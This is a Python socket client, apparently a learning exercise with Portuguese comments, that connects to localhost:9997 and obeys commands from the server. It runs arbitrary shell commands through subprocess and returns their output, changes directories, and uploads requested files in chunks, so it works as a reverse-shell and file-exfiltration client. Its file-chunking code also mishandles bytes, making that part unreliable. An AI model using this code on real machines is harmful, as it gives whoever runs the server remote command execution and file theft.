import socket
import selectors
import sys
import types
import subprocess
import os
import time
import math

_HOST = 'localhost'
_PORT = 9997
_MAX_MSG_SIZE = 4096

if __name__ == "__main__":
    sel = None
    soc = None
    key = None
    mask = None
    events = None

    send_file = None

    # Iniciando o seletor como padrão
    sel = selectors.DefaultSelector()

    # AF_INET: Formato (Host, Port)
    # SOCK_STREAM: TCP
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Setando como não bloqueante
    soc.setblocking(False)

    # Conectando
    soc.connect_ex((_HOST, _PORT))

    sel.register(soc, selectors.EVENT_READ | selectors.EVENT_WRITE)

    while True:
        events = sel.select()

        for key, mask in events:
            # Recebendo oque foi enviado
            if mask & selectors.EVENT_READ:
                entry = key.fileobj.recv(_MAX_MSG_SIZE)
                entry = entry.decode()
                # Se não receber nada, fecha a conexão
                if not entry:
                    print("Fechando conexão: {}".format(key.fileobj))
                    sel.unregister(key.fileobj)
                    key.fileobj.close()
                    # continue
                    break

                # Se o cliente não fechou a conexão, podemos tratar a mensagem
                # Tratando se for msg
                if entry[:3] == 'msg':
                    print(entry[3:])
                    soc.send(('Mensagem Recebida! >>> {}'.format(entry[3:])).encode())

                # Tratando se for Comando
                elif entry[:3] == 'cmd':
                    print(entry)
                    # Reconhece o cmd copiar
                    if entry[3:6] == 'cpy':
                        caminho_arq = os.path.join(os.getcwd(), entry[6:len(entry)-1])

                        # Criando um vetor [<arq>, <tam_arq>, <verdadeiro>]
                        # Posição           0      1          2
                        send_file = [open(caminho_arq, 'rb'), os.path.getsize(caminho_arq), True]

                        # soc.send(str(send_file[1]).encode())
                
                        #with open(caminho_arq, 'rb') as file:
                        #    # Dividindo o Arquivo
                        #    tam_arq = str(math.ceil(os.path.getsize(caminho_arq) / 512))
                        #    while True:
                        #        data = file.read(512)
                        #        if not data:
                        #            break
                        #        soc.send('FIL{}'.format(data).encode())
                        #        print('Arquivo {} Enviado!'.format(entry[6:]))
                        #        continue
                    elif entry[3:] == 'cd':
                        soc.send(os.getcwd().encode())
                        continue
                    
                    #elif len(entry) > 0:
                        #saida = subprocess.getoutput(entry[3:])
                        #print(saida)
                        #soc.send(saida.encode())

                    elif entry[3:5] == 'cd':
                        print('Comando do Servidor >>> {}'.format(entry[6:]))
                        os.chdir(entry[6:len(entry)-1])
                        soc.send((os.getcwd()).encode())
                        
                    elif len(entry) > 0:
                        saida = subprocess.getoutput(entry[3:])
                        print(saida)
                        soc.sendall(saida.encode())

                        
            elif mask & selectors.EVENT_WRITE:
                if send_file:
                    # Por isso a 2 posição e Boleana, se for True envia o tamanho
                    # ai mudamos para false, para não enviar o tamanho
                    # mais de uma vez... Genial
                    if send_file[2]:
                        print('Enviando tamanho ... {}'.format(send_file[1]))
                        key.fileobj.send('FIL{}'.format(send_file[1]).encode())
                        send_file[2] = False

                    # Se o tamanho do arq for maior que 0
                    elif send_file[1] > 0:
                        # Se o tamanho for maior que 512
                        if send_file[1] > 512:
                            print('Enviando pedaço ... 512')
                            # Vai ler apenas 512<tamanho> do arquivo e guardar no data
                            data = send_file[0].read(512)
                            # Enviando o pedaço do arqv
                            key.fileobj.send('FIL512{}'.format(data).encode())
                            # Removendo o pedaço enviado do vetor
                            send_file[1] = send_file[1] - 512
                            
                        # se for menor envia direto
                        else:
                            print('Enviando pedaço ... {}'.format(send_file[1]))
                            data = send_file[0].read(send_file[1])
                            print(data)
                            key.fileobj.send('FIL{:03d}{}'.format(len(data), data).encode())
                            send_file[1] = 0

                        if send_file[1] == 0:
                            send_file[0].close()
                        
        #print("[{}] {}".format(key.fileobj, entry))
        #soc.send(entry.encode())
